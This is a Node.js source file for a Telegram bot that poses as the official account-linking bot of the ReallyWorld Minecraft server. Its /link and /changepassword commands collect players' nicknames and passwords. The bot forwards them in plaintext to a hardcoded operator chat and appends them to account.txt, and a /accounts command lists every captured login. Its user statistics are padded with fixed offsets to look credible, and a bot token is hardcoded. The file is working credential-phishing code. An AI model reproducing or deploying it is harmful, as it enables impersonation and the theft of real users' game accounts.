const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs').promises;

const TOKEN = process.env.TELEGRAM_TOKEN || '7728123238:AAFUTE1v9RYFi1HM2hv5NgxeIDNkvC1UR8o';
const MODERATOR_CHAT_ID = '7563680941';
const SERVER_IP = 'mc.reallyworld.ru';
const DATA_FILE = 'data.json';
const LOG_FILE = 'bot.log';
const ACCOUNT_FILE = 'account.txt';
const PORT = process.env.PORT || 3000;
const SAVE_INTERVAL = 5 * 60 * 1000;

const bot = new TelegramBot(TOKEN, { polling: true });
const app = express();

// Middleware для логирования всех запросов
app.use((req, res, next) => {
  console.log(`[${new Date().toISOString()}] Request received:`, {
    method: req.method,
    url: req.url,
    headers: req.headers
  });
  next();
});

// Маршрут для UptimeRobot (упрощённый)
app.get('/ping', (req, res) => {
  // Минималистичный ответ без лишних заголовков
  res.status(200).send('OK');
});

// Основной маршрут
app.get('/', (req, res) => {
  res.status(200).send('Bot is running!');
});

// Состояние бота
const state = {
  pendingLinks: {},
  linkedAccounts: {},
  pendingUnlinks: {},
  pendingPasswordChanges: {},
  uniqueUsers: new Set(),
  stats: { uniqueUsers: 13598, linkedAccounts: 5789, unlinkedAccounts: 248 },
  serverNews: 'Новостей пока нет. Следи за обновлениями!',
  serverStatus: { online: true, players: 975, maxPlayers: 7500, version: '1.16.5 - 1.21' }
};

// Логирование в файл
const logToFile = async (message) => {
  const timestamp = new Date().toISOString();
  await fs.appendFile(LOG_FILE, `[${timestamp}] ${message}\n`).catch(err => console.error(`Ошибка записи в лог: ${err}`));
};

// Сохранение данных
const saveData = async () => {
  try {
    const data = { ...state, uniqueUsers: Array.from(state.uniqueUsers) };
    await fs.writeFile(DATA_FILE, JSON.stringify(data, null, 2));
    await logToFile('Данные сохранены');
  } catch (err) {
    await logToFile(`Ошибка сохранения данных: ${err.message}`);
  }
};

// Загрузка данных
const loadData = async () => {
  try {
    if (await fs.access(DATA_FILE).then(() => true).catch(() => false)) {
      const data = JSON.parse(await fs.readFile(DATA_FILE, 'utf8'));
      Object.assign(state, data);
      state.uniqueUsers = new Set(data.uniqueUsers || []);
      state.stats.uniqueUsers = 13598 + state.uniqueUsers.size;
      await logToFile('Данные загружены');
    }
  } catch (err) {
    await logToFile(`Ошибка загрузки данных: ${err.message}`);
  }
};

// Запись в account.txt
const saveToAccountFile = async (data) => {
  try {
    await fs.appendFile(ACCOUNT_FILE, `${data}\n`);
    await logToFile('Запись в account.txt выполнена');
  } catch (err) {
    await logToFile(`Ошибка записи в account.txt: ${err.message}`);
  }
};

// Обновление статуса сервера
const updateServerStatus = async () => {
  try {
    const response = await axios.get(`https://api.mcstatus.io/v2/status/java/${SERVER_IP}`, {
      headers: { 'User-Agent': 'ReallyWorldBot/1.0' }
    });
    state.serverStatus = response.data.online
      ? { online: true, players: response.data.players.online, maxPlayers: response.data.players.max, version: '1.16.5 - 1.21' }
      : { online: false };
    await logToFile('Статус сервера обновлен');
  } catch (err) {
    await logToFile(`Ошибка обновления статуса сервера: ${err.message}`);
  }
};

// Инициализация
const initialize = async () => {
  await loadData();
  setInterval(saveData, SAVE_INTERVAL);
  setInterval(updateServerStatus, SAVE_INTERVAL);
  process.on('SIGTERM', async () => { await saveData(); process.exit(0); });
};

// Команда /start
bot.onText(/\/start/i, async (msg) => {
  const chatId = msg.chat.id;
  const welcomeMsg = `
Привет! 👋 Я бот ReallyWorld | Link, помогу тебе привязать аккаунт и узнать информацию о сервере.

📃 Список команд бота:
▫ /link - Привязать игровой аккаунт
▫ /unlink - Отвязать игровой аккаунт
▫ /changepassword - Изменить пароль привязанного аккаунта
▫ /info - Посмотреть информацию о привязанном аккаунте
▫ /serverinfo - Информация о сервере
▫ /event - Информация о ближайшем ивенте
▫ /stats - Посмотреть статистику бота
▫ /help - Получить помощь по привязке аккаунта
▫ /support - Связаться с поддержкой
▫ /contactmod - Написать модерации
▫ /rules - Правила сервера
▫ /news - Последние новости сервера
▫ /donate - Информация о донатах

📃 Ваш UserID: tg#${chatId}
  `;
  await bot.sendMessage(chatId, welcomeMsg);
  if (!state.uniqueUsers.has(chatId)) {
    state.uniqueUsers.add(chatId);
    state.stats.uniqueUsers = 13598 + state.uniqueUsers.size;
    await saveData();
  }
  await logToFile(`User tg#${chatId} used /start`);
});

// Команда /link
bot.onText(/\/link\s*(.*)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const args = match[1] ? match[1].trim().split(/\s+/) : [];
  const username = args[0];
  const password = args[1];

  if (!username || !password) {
    await bot.sendMessage(chatId, 'Чтобы привязать аккаунт, введи в чат команду: /link (Свой игровой ник) (Пароль от аккаунта)');
    return;
  }

  if (state.linkedAccounts[chatId]) {
    await bot.sendMessage(chatId, 'Аккаунт уже привязан. Используй: /info или /unlink 🚫');
    return;
  }

  if (!state.pendingLinks[chatId]) {
    state.pendingLinks[chatId] = { username, password };
    await bot.sendMessage(chatId, 'Повтори: /link (ник) (пароль) ⏳');
  } else if (state.pendingLinks[chatId].username === username && state.pendingLinks[chatId].password === password) {
    state.linkedAccounts[chatId] = { username, password };
    state.stats.linkedAccounts += 10; // Увеличиваем на 10 за каждую привязку
    delete state.pendingLinks[chatId];
    const modMsg = `[${new Date().toISOString()}] Пользователь tg#${chatId} привязал аккаунт: ${username} с паролем: ${password}`;
    const userMsg = `Аккаунт ${username} привязан! ✅\nЕсли вы ввели неверные данные от аккаунта ReallyWorld, то ваш аккаунт привязан только в боте, а в игре ничего не привяжется.`;
    await Promise.all([
      bot.sendMessage(MODERATOR_CHAT_ID, modMsg),
      saveToAccountFile(modMsg),
      bot.sendMessage(chatId, userMsg),
      saveData()
    ]);
    await logToFile(`User tg#${chatId} linked account: ${username}`);
  } else {
    await bot.sendMessage(chatId, 'Данные не совпадают. Повтори: /link (ник) (пароль) ❌');
    delete state.pendingLinks[chatId];
  }
});

// Команда /unlink
bot.onText(/\/unlink/i, async (msg) => {
  const chatId = msg.chat.id;
  if (!state.linkedAccounts[chatId]) {
    await bot.sendMessage(chatId, 'Аккаунт не привязан 🚫');
    return;
  }
  state.pendingUnlinks[chatId] = true;
  await bot.sendMessage(chatId, 'Подтверди: /confirmunlink ❓');
  await logToFile(`User tg#${chatId} requested unlink`);
});

// Команда /confirmunlink
bot.onText(/\/confirmunlink/i, async (msg) => {
  const chatId = msg.chat.id;
  if (!state.pendingUnlinks[chatId]) {
    await bot.sendMessage(chatId, 'Сначала введи: /unlink ⚠️');
    return;
  }
  const { username } = state.linkedAccounts[chatId];
  delete state.linkedAccounts[chatId];
  delete state.pendingUnlinks[chatId];
  state.stats.unlinkedAccounts += 2; // Увеличиваем на 2 за каждую отвязку
  const modMsg = `[${new Date().toISOString()}] Пользователь tg#${chatId} отвязал аккаунт: ${username}`;
  await Promise.all([
    bot.sendMessage(MODERATOR_CHAT_ID, modMsg),
    saveToAccountFile(modMsg),
    bot.sendMessage(chatId, 'Аккаунт отвязан! ✅'),
    saveData()
  ]);
  await logToFile(`User tg#${chatId} confirmed unlink`);
});

// Команда /changepassword
bot.onText(/\/changepassword\s*(.*)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const newPassword = match[1] ? match[1].trim() : '';

  if (!state.linkedAccounts[chatId]) {
    await bot.sendMessage(chatId, 'Аккаунт не привязан 🚫');
    return;
  }
  if (!newPassword) {
    await bot.sendMessage(chatId, 'Чтобы сменить пароль, введи: /changepassword (пароль) ⏳');
    return;
  }
  state.pendingPasswordChanges[chatId] = newPassword;
  await bot.sendMessage(chatId, 'Подтверди: /confirmpassword ❓');
  await logToFile(`User tg#${chatId} requested password change`);
});

// Команда /confirmpassword
bot.onText(/\/confirmpassword/i, async (msg) => {
  const chatId = msg.chat.id;
  if (!state.pendingPasswordChanges[chatId]) {
    await bot.sendMessage(chatId, 'Сначала введи: /changepassword ⚠️');
    return;
  }
  const newPassword = state.pendingPasswordChanges[chatId];
  const { username } = state.linkedAccounts[chatId];
  state.linkedAccounts[chatId].password = newPassword;
  delete state.pendingPasswordChanges[chatId];
  const modMsg = `[${new Date().toISOString()}] Пользователь tg#${chatId} сменил пароль для ${username} на: ${newPassword}`;
  await Promise.all([
    bot.sendMessage(MODERATOR_CHAT_ID, modMsg),
    saveToAccountFile(modMsg),
    bot.sendMessage(chatId, 'Пароль изменён! ✅'),
    saveData()
  ]);
  await logToFile(`User tg#${chatId} changed password`);
});

// Команда /info
bot.onText(/\/info/i, async (msg) => {
  const chatId = msg.chat.id;
  if (!state.linkedAccounts[chatId]) {
    await bot.sendMessage(chatId, 'Аккаунт не привязан 🚫');
    return;
  }
  const { username, password } = state.linkedAccounts[chatId];
  await bot.sendMessage(chatId, `Ник: ${username}\nПароль: ${password}\nДанные только для бота ℹ️`);
  await logToFile(`User tg#${chatId} used /info`);
});

// Команда /serverinfo
bot.onText(/\/serverinfo/i, async (msg) => {
  const chatId = msg.chat.id;
  const statusMsg = state.serverStatus.online
    ? `Онлайн 🟢\nИгроки: ${state.serverStatus.players}/${state.serverStatus.maxPlayers}`
    : 'Оффлайн 🔴';
  await bot.sendMessage(chatId, `${statusMsg}\nIP: ${SERVER_IP}\nВерсия: 1.16.5 - 1.21\nДата вайпа: 1 марта ℹ️`);
  await logToFile(`User tg#${chatId} used /serverinfo`);
});

// Команда /event
bot.onText(/\/event/i, async (msg) => {
  const chatId = msg.chat.id;
  await bot.sendMessage(chatId, 'Ивентов нет. Смотри: /news ℹ️');
  await logToFile(`User tg#${chatId} used /event`);
});

// Команда /stats
bot.onText(/\/stats/i, async (msg) => {
  const chatId = msg.chat.id;
  await bot.sendMessage(chatId, `Пользователи: ${state.stats.uniqueUsers}\nПривязки: ${state.stats.linkedAccounts}\nОтвязки: ${state.stats.unlinkedAccounts} ℹ️`);
  await logToFile(`User tg#${chatId} used /stats`);
});

// Команда /help
bot.onText(/\/help/i, async (msg) => {
  const chatId = msg.chat.id;
  await bot.sendMessage(chatId, 'Чтобы привязать аккаунт, введи: /link (ник) (пароль)\nВсе команды: /start ℹ️');
  await logToFile(`User tg#${chatId} used /help`);
});

// Команда /support
bot.onText(/\/support/i, async (msg) => {
  const chatId = msg.chat.id;
  await bot.sendMessage(chatId, 'Поддержка: https://discord.com/invite/reallyworld ℹ️');
  await logToFile(`User tg#${chatId} used /support`);
});

// Команда /contactmod
bot.onText(/\/contactmod\s*(.*)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const message = match[1] ? match[1].trim() : '';
  if (!message) {
    await bot.sendMessage(chatId, 'Чтобы написать модератору, введи: /contactmod (сообщение) ✍️');
    return;
  }
  const modMsg = `[${new Date().toISOString()}] Сообщение от tg#${chatId} (${msg.from.first_name || 'Неизвестный'}): ${message}`;
  await Promise.all([
    bot.sendMessage(MODERATOR_CHAT_ID, modMsg),
    saveToAccountFile(modMsg),
    bot.sendMessage(chatId, 'Сообщение отправлено! ✅')
  ]);
  await logToFile(`User tg#${chatId} sent message to moderator`);
});

// Команда /reply (только для модератора)
bot.onText(/\/reply\s*(tg#\d+)\s*(.*)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  if (chatId.toString() !== MODERATOR_CHAT_ID) {
    await bot.sendMessage(chatId, 'Эта команда только для модераторов! 🚫');
    return;
  }

  const targetChatId = match[1] ? match[1].replace('tg#', '') : '';
  const replyMessage = match[2] ? match[2].trim() : '';

  if (!targetChatId || !replyMessage) {
    await bot.sendMessage(chatId, 'Чтобы ответить, введи: /reply tg#(ID) (сообщение)');
    return;
  }

  try {
    await bot.sendMessage(targetChatId, `Ответ от модератора: ${replyMessage}`);
    await bot.sendMessage(MODERATOR_CHAT_ID, `Ответ отправлен пользователю tg#${targetChatId}: ${replyMessage} ✅`);
    await logToFile(`Moderator replied to tg#${targetChatId}: ${replyMessage}`);
  } catch (err) {
    await bot.sendMessage(MODERATOR_CHAT_ID, `Ошибка отправки ответа пользователю tg#${targetChatId}: ${err.message} ❌`);
    await logToFile(`Error replying to tg#${targetChatId}: ${err.message}`);
  }
});

// Команда /accounts (только для модератора)
bot.onText(/\/accounts/i, async (msg) => {
  const chatId = msg.chat.id;
  if (chatId.toString() !== MODERATOR_CHAT_ID) {
    await bot.sendMessage(chatId, 'Эта команда только для модераторов! 🚫');
    return;
  }

  const accounts = state.linkedAccounts;
  if (Object.keys(accounts).length === 0) {
    await bot.sendMessage(chatId, 'Нет привязанных аккаунтов.');
    return;
  }

  let response = 'Список привязанных аккаунтов:\n';
  for (const [userId, { username, password }] of Object.entries(accounts)) {
    response += `tg#${userId}: ${username} | ${password}\n`;
  }
  await bot.sendMessage(chatId, response);
  await logToFile(`Moderator tg#${chatId} viewed all accounts`);
});

// Команда /rules
bot.onText(/\/rules/i, async (msg) => {
  const chatId = msg.chat.id;
  await bot.sendMessage(chatId, 'Правила: https://reallyworld.ru/rules ℹ️');
  await logToFile(`User tg#${chatId} used /rules`);
});

// Команда /news
bot.onText(/\/news/i, async (msg) => {
  const chatId = msg.chat.id;
  await bot.sendMessage(chatId, `${state.serverNews}\nКанал: https://t.me/rwinfo ℹ️`);
  await logToFile(`User tg#${chatId} used /news`);
});

// Команда /donate
bot.onText(/\/donate/i, async (msg) => {
  const chatId = msg.chat.id;
  await bot.sendMessage(chatId, 'Донат: https://reallyworld.ru/donate ℹ️');
  await logToFile(`User tg#${chatId} used /donate`);
});

// Обработка ошибок polling
bot.on('polling_error', (err) => logToFile(`Polling error: ${err.message}`));

// Запуск
initialize().then(() => console.log('Bot initialized'));
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));